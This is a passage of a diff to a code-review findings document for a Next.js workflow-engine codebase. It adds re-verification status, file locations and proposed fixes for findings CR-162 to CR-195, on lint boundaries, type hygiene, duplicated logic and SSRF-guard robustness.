+- **Re-verification note:** The `lib/` client-import rule still covers only `app/**` and `components/**`, so `hooks/`, `types/` and `constants/` are unchecked. `hooks/use-highlighted-code.ts` still imports the non-allowlisted `@/lib/highlighter`, and `types/start-contract.ts` re-exports the runtime `parseStartContract` from `lib/engine/nodes/kinds/start/contract`. `types/template-lint.ts` is type-only but points at `lib/engine/templates/template-lint.ts`, which imports `db`. Fix: extend the rule's `files` to `hooks/**`, `constants/**` and `types/**` (type-only allowed), move `highlighter.tsx` out of `lib/`, move the start-contract schema to a client-safe module, and define `LintProblem` in `types/`.
 
 - **Severity:** Medium
 - **Category:** Boundaries
@@ -3781,6 +4443,10 @@ Original findings, verbatim:
 
 ### CR-162 [Medium] AGENTS.md §5 rules are downgraded to `warn` for `lib/**` and `scripts/**`, which hides 56 `any` and about 30 `!`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 03](review-tasks/03-lint-rule-hardening.md)
+- **Current location:** eslint.config.mjs:35-55
+- **Re-verification note:** The override still downgrades `exhaustive-deps`, `no-explicit-any` and `no-non-null-assertion` to `warn` for the whole `lib/**/*.ts` and `scripts/**` trees; lint currently reports 0 errors and 143 warnings there. The comment still cites the nonexistent "AGENTS.md section 6", and the `lib/**/*.ts` glob still misses `lib/highlighter.tsx`. Fix: keep `warn` only for a frozen per-file offender list so new lib files get `error`, then add `--max-warnings` and burn the list down, and fix the stale reference.
+
 - **Severity:** Medium
 - **Category:** Boundaries
 - **Area:** Area 7b — Tooling & config
@@ -3799,6 +4465,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-163 [Medium] Two inline `react-hooks/exhaustive-deps` suppressions in the template editor, and lint does not block inline disables
+
+- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
+- **Current location:** components/template-editor/components/BuilderApiBridge.tsx:14-19, components/template-editor/hooks/use-output-schema-draft.ts:44-69, components/template-editor/components/BuilderFlow.tsx:207, eslint.config.mjs:18-193
+- **Re-verification note:** Both inline `eslint-disable-next-line react-hooks/exhaustive-deps` suppressions remain, and the config has no `linterOptions.reportUnusedDisableDirectives` and no guard against disabling the rule. `BuilderFlow` still wraps `onApi` in an inline lambda, so it is never stable. Fix: make `onApi` stable (`useCallback` in EditorPage, passed straight through) and list it, move output-schema parsing into the change handler, and add `reportUnusedDisableDirectives: "error"` plus a disable-ban (the plugin is a new dep and needs approval).
 
 - **Severity:** Medium
 - **Category:** Boundaries (sources: TOOL-10: Boundaries; TPL-23: Code quality)
@@ -3845,6 +4515,10 @@ Original findings, verbatim:
 
 ### CR-164 [Medium] `docs/flow-templates/review-notes.yaml` uses an invalid `wait_for` and a non-existent output field
 
+- **Status at `abaa007`:** **Open**, fix in [Task 05](review-tasks/05-test-coverage-baseline.md)
+- **Current location:** docs/flow-templates/review-notes.yaml:23, docs/flow-templates/review-notes.yaml:33, lib/engine/templates/template-store.ts:957-968, lib/engine/constants/triggers.ts:26, lib/engine/nodes/kinds/review/schema.ts:18
+- **Re-verification note:** The fixture still uses `wait_for: gitlab_pipeline`, which is not in `WAIT_FOR_SOURCES`, so `nodeTrigger()` still silently drops it and the pipeline node loses its gate. It also still references `nodes.review.output.comment_count`, but the review node publishes `comments`. Nothing imports the docs fixtures in tests. Fix: change these to `pipeline` and `.comments`, make `nodeTrigger`/validation reject unknown `wait_for` and trigger types with a lint error, and add a vitest that imports every `docs/flow-templates/*.yaml`.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 7b — Tooling & config
@@ -3868,6 +4542,10 @@ Original findings, verbatim:
 
 ### CR-165 [Medium] `server-only` is neither a declared dependency nor lint-enforced; 9 `lib/` modules with db/fs/child_process imports lack it
 
+- **Status at `abaa007`:** **Open**, fix in [Task 04](review-tasks/04-client-server-boundaries.md)
+- **Current location:** package.json:13-58, lib/engine/flow-engine.ts:1, lib/engine/runtime/flow-poller.ts:1, lib/engine/runtime/flow-reconciler.ts:1, lib/engine/runtime/fanout/step-flow-manager.ts:1, lib/engine/templates/template-lint.ts:1, lib/engine/templates/template-store.ts:1, lib/engine/runtime/fanout/merge-arena.ts:1-3, lib/engine/nodes/shared/run-context.ts:1-3, lib/engine/nodes/kinds/script/script-node.ts:1-3
+- **Re-verification note:** `server-only` is still not a declared dependency (vitest stubs it; Next aliases it). All nine named modules, at their renamed paths, import `db`, `fs` or `child_process` with no marker. Only 36 of 139 non-test `lib/*.ts` files have `import "server-only"`. Fix: add `server-only` as a dependency (ask first), add the marker to these files and to every lib module outside the client allowlist, and optionally add a vitest that greps for it.
+
 - **Severity:** Medium
 - **Category:** Boundaries
 - **Area:** Area 7b — Tooling & config
@@ -3886,6 +4564,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-166 [Medium] The settings barrel omits `SettingsProvider`/`useSettings`, forcing deep imports that the partial cross-feature barrel lint rule lets through
+
+- **Status at `abaa007`:** **Open**, fix in [Task 04](review-tasks/04-client-server-boundaries.md)
+- **Current location:** components/settings/index.ts:7-8, app/(workspace)/settings/layout.tsx:1, app/(workspace)/settings/page.tsx:3, app/(workspace)/settings/integrations/page.tsx:4, app/(workspace)/settings/repositories/page.tsx:3, components/settings/repos/ReposSection.tsx:4, components/settings/repos/components/RepoCard.tsx:3, components/settings/repos/hooks/use-repo-form.ts:3, eslint.config.mjs:132-154
+- **Re-verification note:** The settings barrel still exports only fetchers and types, so the four settings routes deep-import `@/components/settings/context`, and `repos/*` self-imports it by absolute path. The lint patterns still miss single-segment deep imports, keep the dead `@/components/panels` entry (that directory no longer exists), and don't guard the `flows`, `chat`, `builder`, `tasks` or `templates` barrels. Fix: export `SettingsProvider` and `useSettings` from the barrel and switch the imports to it, then replace the per-feature patterns with a generic `@/components/*/*` rule plus exceptions, and drop the `panels` entry.
 
 - **Severity:** Medium
 - **Category:** Boundaries
@@ -3933,6 +4615,10 @@ Original findings, verbatim:
 
 ### CR-167 [Low] The four repo routes duplicate their input helpers, and `~` expansion is wrong
 
+- **Status at `abaa007`:** **Open**, fix in [Task 11](review-tasks/11-api-input-validation-settings.md)
+- **Current location:** app/api/repos/route.ts:9-26,31,42; app/api/repos/[id]/route.ts:9-20,27-31; app/api/repos/test-setup/route.ts:11-25; app/api/repos/detect/route.ts:9-12
+- **Re-verification note:** The four repo routes still each carry their own `~` expansion, `optString` and `optTimeoutMs` (keep-on-absent vs null-on-absent variants), `validateLocalPath` still validates nothing, `~bob/x` still becomes `$HOME/bob/x`, and the `.git` existence check is duplicated. Add one Zod repo-input schema (accept only `~` or `~/` prefixes) in `lib/schemas/repo.ts` and move the path/.git checks into a `RepoService` used by all four routes.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -3947,6 +4633,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-168 [Low] Loaders and routes build the same payloads separately, and one copy has already drifted
+
+- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
+- **Current location:** loaders/tasks.ts:23-24,38-40,49-52; loaders/templates.ts:23-33; app/api/tasks/providers/route.ts:11-19; app/api/settings/route.ts:75-78; app/api/models/route.ts:73-75
+- **Re-verification note:** The provider list is still serialized in three places, and `loaders/tasks.ts` still leaves out `contextFields` even though its comment says it matches `GET /api/tasks/providers`. Default-model resolution is duplicated between the settings and models routes, and the `default_execution_mode` read is duplicated between the tasks loader and the settings route. Add `taskRegistry.describe()`, `settingsService.defaultModel()` and `settingsService.defaultExecutionMode()`, and call them from both the loaders and the routes.
 
 - **Severity:** Low
 - **Category:** Boundaries
@@ -3968,6 +4658,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-169 [Low] Domain strings are repeated as literals instead of named constants
+
+- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
+- **Current location:** app/api/settings/route.ts:14,44-49,73-88,122-176; app/api/models/route.ts:35,74; loaders/tasks.ts:50-52; app/api/status/route.ts:25,30,46; app/api/webhooks/gitlab/route.ts:49,62,68; app/api/contracts/route.ts:64; app/api/templates/route.ts:21-24; lib/engine/prompts/prompt-preview.ts:99,126; app/api/flows/[id]/action/route.ts:36-85; components/flows/panels/FanoutStepList.tsx:143,149,157 (plus AgentView/HttpView/ScriptView/DecisionView/StartView action calls); app/api/node-templates/route.ts:22-27
+- **Re-verification note:** All cited literal groups are still present: settings keys, `cloud`/`local`, SQL `'active'`/`'running'`, wait sources, `"start"`/`"nt_start"`/`"auto"`/`"all"`, action names (a `Record<string, …>` map on the server, raw strings on the client) and the node-kind label map. The only change is that the prompt-template keys moved from the prompt route into `PromptPreview`, still as literals. Reuse `FLOW_STATUS`, `WAIT_FOR_SOURCES`, `nodeRegistry.entryKey()` and `KINDED_NODE_TEMPLATE_KINDS`; add client-safe `SETTINGS_KEYS`, `EXECUTION_MODE` and `FLOW_ACTIONS` constants (type the action map `Record<FlowAction, …>`); and bind SQL status values as parameters.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -3994,6 +4688,10 @@ Original findings, verbatim:
 
 ### CR-170 [Low] No DB-touching route declares `runtime = "nodejs"`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 03](review-tasks/03-lint-rule-hardening.md)
+- **Current location:** all 39 app/api/**/route.ts files (none export `runtime`; e.g. app/api/flows/route.ts, app/api/repos/route.ts:6)
+- **Re-verification note:** No route declares `export const runtime = "nodejs"`; they only export `dynamic = "force-dynamic"`. Add the declaration to every DB-touching route. Lint now runs, so also add an ESLint rule (restricted-syntax or a custom rule) that requires it under `app/api/**`.
+
 - **Severity:** Low
 - **Category:** Boundaries
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -4010,6 +4708,10 @@ Original findings, verbatim:
 
 ### CR-171 [Low] The artifact GET crashes with a 500 on malformed `meta` JSON
 
+- **Status at `abaa007`:** **Open**, fix in [Task 34](review-tasks/34-db-row-safety.md)
+- **Current location:** app/api/artifacts/[id]/route.ts:8,12-14
+- **Re-verification note:** `JSON.parse(art.meta)` is still unguarded, so one corrupt `meta` row gives an unhandled 500. The row type is still an ad-hoc `Record<string, unknown>` instead of a `lib/db/rows.ts` mapper. Read through the existing `ArtifactRow` mapper (or add one with a safe JSON column parse) via an `ArtifactService.get(id)`.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -4024,6 +4726,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-172 [Low] `GET /api/graph` falls back to a default graph for unknown flow or template ids
+
+- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
+- **Current location:** app/api/graph/route.ts:20-25,51-55
+- **Re-verification note:** `?flowId=<unknown>` still resolves to null and falls back to `SDLC_TEMPLATE_ID`, and `?templateId=<unknown>` makes `templateStore.graph` return null and falls through to the registry graph. Both return 200 with a plausible but wrong graph. Return 404 when the flow or template isn't found. Drop the null-`template_id` → SDLC fallback too: it only exists for legacy flows, which are out of scope.
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -4040,6 +4746,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-173 [Low] Type escape hatches: double casts, an unchecked downcast, and type imports from a component barrel
+
+- **Status at `abaa007`:** **Open**, fix in [Task 46](review-tasks/46-backend-types-cleanup.md)
+- **Current location:** loaders/flows.ts:31; app/api/contracts/route.ts:136-142,156; lib/engine/prompts/prompt-preview.ts:92; app/api/templates/route.ts:15; loaders/templates.ts:21; app/api/tasks/live/route.ts:23
+- **Re-verification note:** Every escape hatch is still there. The `as unknown as FlowData` cast and the double structural cast in contracts are unchanged. The unchecked plan-def downcast moved from the prompt route into `PromptPreview` (`as unknown as SubPlanPreviewer`). The `({}) as never` catch, the loader's `NodeRow`/`TemplateRow` import from `@/components/templates`, and the no-op `Omit<…, never>` are all unchanged. Fixes: give `flowEngine.get` a declared return type, expose a typed `DeclarativeNode` interface, replace the downcast with a capability or `instanceof` guard, parse request bodies with Zod, and move the row types to `types/`.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -4069,6 +4779,10 @@ Original findings, verbatim:
 
 ### CR-174 [Low] Six identical error boundaries and three copies of `TableSkeleton`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
+- **Current location:** app/error.tsx; app/(workspace)/error.tsx; app/(workspace)/flows/error.tsx; app/(workspace)/settings/error.tsx; app/(workspace)/templates/error.tsx; app/(workspace)/templates/nodes/error.tsx; app/flows/[id]/error.tsx; app/templates/[id]/error.tsx; TableSkeleton in app/(workspace)/flows/loading.tsx:4, app/(workspace)/templates/loading.tsx:4, app/(workspace)/templates/nodes/loading.tsx:4
+- **Re-verification note:** There are still eight near-identical error boundaries (they differ only in log tag and message) and three local copies of `TableSkeleton`, and `components/shared/` has neither. Add `components/shared/RouteError.tsx` and `components/shared/TableSkeleton.tsx`, and make each `error.tsx`/`loading.tsx` a thin wrapper around them.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -4084,6 +4798,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-175 [Low] `tasks/live` keeps its cache in module-level mutable state
+
+- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
+- **Current location:** app/api/tasks/live/route.ts:20-25,55-104
+- **Re-verification note:** The TTL cache is still module-level mutable state in the route file, so HMR drops it, and the route still owns the cache-key derivation and the stale-on-error policy. Move all of this into a `LiveTaskFeed` service in `lib/engine/tasks/`, created via `processSingleton`, and keep the route to Zod-parsing the filters and calling it.
 
 - **Severity:** Low
 - **Category:** Boundaries
@@ -4102,6 +4820,10 @@ Original findings, verbatim:
 
 ### CR-176 [Low] The hook payload cap is checked after the whole body is buffered, and counts characters instead of bytes
 
+- **Status at `abaa007`:** **Open**, fix in [Task 58](review-tasks/58-security-webhook-auth.md)
+- **Current location:** app/api/hooks/[id]/route.ts:35-38
+- **Re-verification note:** `await req.text()` still buffers the whole body before the 1 MB check, and it runs before signature verification, so any unauthenticated caller who knows a hook id can make the server buffer arbitrarily large bodies. `raw.length` also still counts UTF-16 code units, not bytes. Reject early on `Content-Length`, then stream-read with a running byte count that aborts past the cap (or at minimum compare `Buffer.byteLength(raw)`).
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -4117,6 +4839,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-177 [Low] Auto-naming in `POST /api/node-templates` can race and fail on the unique key
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
+- **Current location:** app/api/node-templates/route.ts:22-27,37-48; lib/engine/templates/template-store.ts:571-609,970-972
+- **Re-verification note:** The race itself does not reproduce: better-sqlite3 is synchronous and there is no `await` between the `nodeTemplateByKey` check and `createNodeTemplate`, so in-process requests cannot interleave there. What remains is business logic in the route: auto-naming lives there with its own copy of the slug regex, which must stay in sync with the private `TemplateStore.slugify`, and `body.key` bypasses that check. Move auto-naming into `TemplateStore.createNodeTemplate` (an optional "auto-name" mode), reusing `slugify`.
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -4134,6 +4860,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-178 [Low] Worktree status lists worktrees once per flow instead of once per repo
+
+- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
+- **Current location:** app/api/flows/worktree-status/route.ts:27,55,62-67
+- **Re-verification note:** Each flow still calls `worktrees.listWorktrees(repo.local_path)` plus `isWorktreeDirty` and `localBranchState`, all fanned out with an unbounded `Promise.all`, so about 3N git processes run per poll. Group flows by `repo_id`, list each repo's worktrees once, and cap concurrency, inside a `WorktreeStatusService`.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -4153,6 +4883,10 @@ Original findings, verbatim:
 
 ### CR-179 [Low] The template editor's SSR QueryClient defaults are a hand-copied, already-divergent version of the app provider's
 
+- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
+- **Current location:** app/templates/[id]/page.tsx:29-38; app/providers.tsx:12-21
+- **Re-verification note:** The SSR QueryClient still hand-copies `staleTime: 30_000` and `refetchOnWindowFocus: false`, and adds `retry: false`, which the client provider doesn't have. Export a `QUERY_CLIENT_DEFAULTS` constant (for example `constants/queryClient.ts`) plus a `makeServerQueryClient()` helper, and use them in both places.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -4168,6 +4902,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-180 [Low] Status and flow-kind values are raw string literals throughout the engine
+
+- **Status at `abaa007`:** **Open**, fix in [Task 44](review-tasks/44-engine-stores-and-constants.md)
+- **Current location:** lib/engine/flow-engine.ts (58 status literals, e.g. 123,204,301,340-342,1707,1950); lib/engine/runtime/fanout/step-flow-manager.ts (67, e.g. 699,837,855-857,1006-1007,1160-1163,1194); lib/engine/runtime/flow-reconciler.ts (17); lib/engine/runtime/plan-step-store.ts (14, e.g. 161,222-223,260-262); lib/engine/runtime/flow-poller.ts:50
+- **Re-verification note:** The engine still uses raw status and flow-kind literals. Only the new `split-manager.ts` uses `FLOW_STATUS` and named status sets. The cited drift still exists: `deletableStepIds` (step-flow-manager.ts:1006-1007) treats `skipped` as not started, while `deletableGuard` (plan-step-store.ts:260-262) treats it as started. Add a server-safe `NODE_STATUS`/`FLOW_KIND` plus named predicate sets (`STARTED`, `TERMINAL_SUCCESS`), as split-manager already does, and use them, starting with the two diverging guards.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -4187,6 +4925,10 @@ Original findings, verbatim:
 
 ### CR-181 [Low] Built-in def keys hard-coded as strings despite the "no node-key constants" design and the existing `NODE_KEYS`
 
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 44](review-tasks/44-engine-stores-and-constants.md)
+- **Current location:** lib/engine/templates/template-lint.ts:190,232
+- **Re-verification note:** The engine-side literals are gone. Approval ownership now goes through `def.builtinApproval` (flow-engine.ts:1539), the step child template comes from `parentDef.childTemplateId()` (step-flow-manager.ts:421-430), and roles go through `keyOfRole(NODE_KEYS.*)`. Two spots remain in template lint, `nt.key === "plan"` and `["plan","pipeline","review","resolve"].includes(...)`; replace them with `NODE_KEYS.*` or a registry capability query.
+
 - **Severity:** Low
 - **Category:** Boundaries
 - **Area:** Area 2 — Engine core & shared lib
@@ -4204,6 +4946,10 @@ Original findings, verbatim:
 
 ### CR-182 [Low] `any` types in poller, groupEvents, steps, the Jira provider and the SSRF guard
 
+- **Status at `abaa007`:** **Open**, fix in [Task 46](review-tasks/46-backend-types-cleanup.md)
+- **Current location:** lib/engine/runtime/flow-poller.ts:50,56,68,106,112,142,150; lib/groupEvents.ts:22,67,288; lib/engine/runtime/plan-step-store.ts:303; lib/engine/tasks/providers/jira.ts:207,239,279,286; lib/net/ssrf-guard.ts:149
+- **Re-verification note:** Every cited `any` is still present at the moved paths. They currently show up only as lint warnings, because `lib/` is downgraded to warn. Use the `rows.all(FlowRow/BranchRow, …)` mappers in the poller, a Zod schema for Jira responses, `unknown` plus narrowing in groupEvents and plan-step-store, and the `dns.LookupAddress` callback type in the SSRF lookup.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 2 — Engine core & shared lib
@@ -4220,6 +4966,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-183 [Low] Non-null `!` assertions on data that may be missing
+
+- **Status at `abaa007`:** **Open**, fix in [Task 46](review-tasks/46-backend-types-cleanup.md)
+- **Current location:** lib/engine/flow-engine.ts:455,1006; lib/engine/runtime/fanout/step-flow-manager.ts:518,526,538-540,1104,1124; lib/engine/templates/template-store.ts:416,608,700,721,793,815; lib/engine/runtime/hook-store.ts:104; lib/engine/runtime/plan-step-store.ts:73,214; lib/engine/templates/template-lint.ts:195,286
+- **Re-verification note:** Non-null assertions after DB reads and filters are still there (`this.nodeTemplate(id)!`, `this.flowTemplate(templateId)!`, `hookForNode(...)!`, `s.childFlowId!`, and others). Narrow with type-guard filters, reuse values already read (the loop at template-store.ts:793/815 re-reads `nt`), and throw a typed `NotFoundError` after DB reads.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -4239,6 +4989,10 @@ Original findings, verbatim:
 
 ### CR-184 [Low] Duplicated logic inside `FlowEngine`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 44](review-tasks/44-engine-stores-and-constants.md)
+- **Current location:** lib/engine/flow-engine.ts:128-141,206-215,262-271 (node snapshot insert, now 3 copies incl. createSplitChild); 367-379 and 402-415 (run token rollup); 305-306,346-347,1011,1121,1301,1361,1931 and step-flow-manager.ts:632,739 (node-id lookup for events); flow-engine.ts:609+611 (`updated_at` written twice in `bg()`)
+- **Re-verification note:** The duplication has grown: the new `createSplitChild` copied the node-snapshot block a third time. Like `createStepChild`, it does not provision `wait_for: webhook` hooks the way `create()` does; it relies on `armNodeWait`'s `ensureForNode` instead. Extract `insertNodeSnapshots(flowId, graph, {provisionHooks})`, `runTokens(r)` and `emitNodeEvent(flowId, key, …)` (or `NodeStore.idOf`), and delete the duplicate `UPDATE flows SET updated_at` in `bg()`'s catch.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 2 — Engine core & shared lib
@@ -4255,6 +5009,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-185 [Low] `FlowEngine.get()` performs N+1 queries per request
+
+- **Status at `abaa007`:** **Open**, fix in [Task 45](review-tasks/45-flow-engine-decomposition.md)
+- **Current location:** lib/engine/flow-engine.ts:358-503 (431,433 per-step child flow + nodes; 467-472 full node_templates scan with linear `find`; 498-500 per-node artifact query incl. `content`; 394 `stepFlows.mergeStates`)
+- **Re-verification note:** Unchanged from the reviewed commit. Only child runs are batched (one `IN` query), which was already true before. Each poll still runs two queries per step child and one per-node artifact query that selects full bodies, and searches node templates linearly. Batch child flows, child nodes and artifacts with `IN (...)` and group them in memory, index `ntRows` in a `Map`, and return artifact metadata only, lazy-loading content.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -4280,6 +5038,10 @@ Original findings, verbatim:
 
 ### CR-186 [Low] `secrets.ts` is a loose-function module holding unrelated responsibilities
 
+- **Status at `abaa007`:** **Open**, fix in [Task 50](review-tasks/50-small-module-cleanups.md)
+- **Current location:** lib/engine/secrets.ts:11-39
+- **Re-verification note:** Still a loose-function module, `getSecrets`/`redactSecrets`/`httpAllowlist`, reading the plain `settings` table on every call. Convert it to a `SecretStore` class with an injected db (`all()`, `redact()`), move `httpAllowlist` to an `HttpPolicy`/settings service, and flag plaintext-at-rest storage in the PR description.
+
 - **Severity:** Low
 - **Category:** Boundaries
 - **Area:** Area 2 — Engine core & shared lib
@@ -4298,6 +5060,10 @@ Original findings, verbatim:
 
 ### CR-187 [Low] Dead code and no-ops
 
+- **Status at `abaa007`:** **Open**, fix in [Task 07](review-tasks/07-remove-dead-and-legacy-code.md)
+- **Current location:** lib/engine/runtime/fanout/step-flow-manager.ts:1167-1170 (`latestMergeStatus` unused), 921-926 (node fetched only for presence); lib/engine/runtime/fanout/merge-arena.ts:67-71 (`dropLocks` never called), 245 (`void pushed`); lib/groupEvents.ts:92,273 (`finalizeSection` no-op); lib/engine/flow-engine.ts:437-440 (try/catch that cannot throw); lib/format.ts:51 (unused `n`); lib/engine/tasks/providers/jira.ts:293 (`join(cond ? "" : "")`); lib/net/ssrf-helpers.ts:22 (`RESOLVE_TIMEOUT_MS` unused)
+- **Re-verification note:** All cited dead code and no-ops still exist at the moved paths. Delete them, or wire `RESOLVE_TIMEOUT_MS` into the DNS lookup (see CR-189).
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 2 — Engine core & shared lib
@@ -4315,6 +5081,10 @@ Original findings, verbatim:
 
 ### CR-188 [Low] SSRF helper throws `SsrfReason`, not `SsrfError`, so callers see two error types for one policy
 
+- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
+- **Current location:** lib/net/ssrf-helpers.ts:44,49,56,83-89; lib/net/ssrf-guard.ts:43-48,110-121
+- **Re-verification note:** The helpers still throw `SsrfReason`, which `resolveAndCheck` does not catch. Blocked private IPs therefore surface as `SsrfReason`, while scheme and allowlist rejections are `SsrfError`. Nothing outside `lib/net` checks `instanceof` today, so the impact is latent. Move `SsrfError` into a shared `ssrf-error.ts`, throw it from the helpers, and delete `SsrfReason`.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 2 — Engine core & shared lib
@@ -4330,6 +5100,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-189 [Low] SSRF guard has no DNS timeout and only an idle socket timeout
+
+- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
+- **Current location:** lib/net/ssrf-helpers.ts:22,30-32; lib/net/ssrf-guard.ts:79-99,175-177
+- **Re-verification note:** `lookupAll` still has no timeout (the constant is unused), and `req.setTimeout` is still only an idle timeout applied per hop. A slow-trickle server can keep an http node running indefinitely, and the time budget multiplies across up to 5 redirects. Race the lookup against `RESOLVE_TIMEOUT_MS`, and enforce one total deadline (an `AbortController` or timer started in `guardedRequest`) across all hops.
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -4351,6 +5125,10 @@ Original findings, verbatim:
 
 ### CR-190 [Low] IPv6 literal URLs never match the IP-literal path, because `URL.hostname` keeps the brackets
 
+- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
+- **Current location:** lib/net/ssrf-helpers.ts:24-28; lib/net/ssrf-guard.ts:110-113
+- **Re-verification note:** Confirmed in Node: `new URL("http://[2001:db8::1]/").hostname` is `"[2001:db8::1]"`, so `ipaddr.isValid` rejects it and the request falls through to a failing DNS lookup. This fails closed, but allowlisted IPv6 literals can never work and the error text is misleading. Strip the surrounding `[`/`]` before `isValid`/`parse`.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -4367,6 +5145,10 @@ Original findings, verbatim:
 
 ### CR-191 [Low] YAML export emits edge endpoints unquoted, so node keys `true`/`false`/`null` break the round-trip
 
+- **Status at `abaa007`:** **Open**, fix in [Task 24](review-tasks/24-template-snapshot-and-yaml.md)
+- **Current location:** lib/engine/templates/template-yaml.ts:93,143-148; lib/engine/templates/template-store.ts:787
+- **Re-verification note:** Edges are still emitted as unquoted `- [${e.from}, ${e.to}]`, and the key regex still allows `true`/`false`/`null`, so export, then import, of such a template fails with "edge endpoints must be node keys". Emit `JSON.stringify(e.from)`/`JSON.stringify(e.to)`, or reserve those keys in validation.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -4381,6 +5163,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-192 [Low] Checklist bulk replace moves protected (started) steps to the top
+
+- **Status at `abaa007`:** **Open**, fix in [Task 27](review-tasks/27-plan-checklist-integrity.md)
+- **Current location:** lib/engine/runtime/plan-step-store.ts:142-197 (176 `i + survivors.length`, 191 survivor position `i`)
+- **Re-verification note:** A bulk replace still re-inserts started (survivor) steps at positions 0..k-1 and shifts every edited row by `survivors.length`. Matched started rows are skipped in the main loop, so their input index is lost, and every bulk edit reorders the checklist with started steps first. Use the editor input index as the position for every matched row, survivors included, and append only unmatched survivors at the end.
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -4401,6 +5187,10 @@ Original findings, verbatim:
 
 ### CR-193 [Low] Schedule triggers drift and are interval-only
 
+- **Status at `abaa007`:** **Open**, fix in [Task 25](review-tasks/25-wait-timers-and-poller.md)
+- **Current location:** lib/engine/runtime/flow-poller.ts:81-103 (92-93); lib/engine/templates/template-store.ts:895-909
+- **Re-verification note:** The next fire is still computed as `now + interval`, so each tick's lateness accumulates. Schedules remain interval-only, with no cron or timezone. Advance from `due` and skip missed slots (`due + ceil((now-due)/iv)*iv`), and add cron plus timezone to the trigger schema if wall-clock schedules are needed.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -4416,6 +5206,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-194 [Low] Unbounded in-memory maps in long-lived singletons
+
+- **Status at `abaa007`:** **Open**, fix in [Task 25](review-tasks/25-wait-timers-and-poller.md)
+- **Current location:** lib/cache.ts:9-12,17-22; app/api/tasks/live/route.ts:21; lib/engine/runtime/flow-reconciler.ts:40,44; lib/engine/runtime/flow-poller.ts:23
+- **Re-verification note:** `TtlCache` still never evicts, and its keys include free search text, so it grows without bound. `Reconciler.lastReconcile`/`flaggedOrphans` and `FlowPoller.lastCommentCount` are never pruned. The live-task route's stale-on-error fallback reads expired entries through `entry()`, so deleting on expired read would break it. Use a size cap with oldest-first eviction or a periodic sweep of entries much older than the TTL instead, and prune the engine maps on flow delete or when a flow goes inactive.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -4434,6 +5228,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-195 [Low] `lib/engine` imports the JSONata evaluator from `components/template-editor` (inverted server→UI boundary)
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 50](review-tasks/50-small-module-cleanups.md)
+- **Current location:** lib/jsonata/eval.ts:19
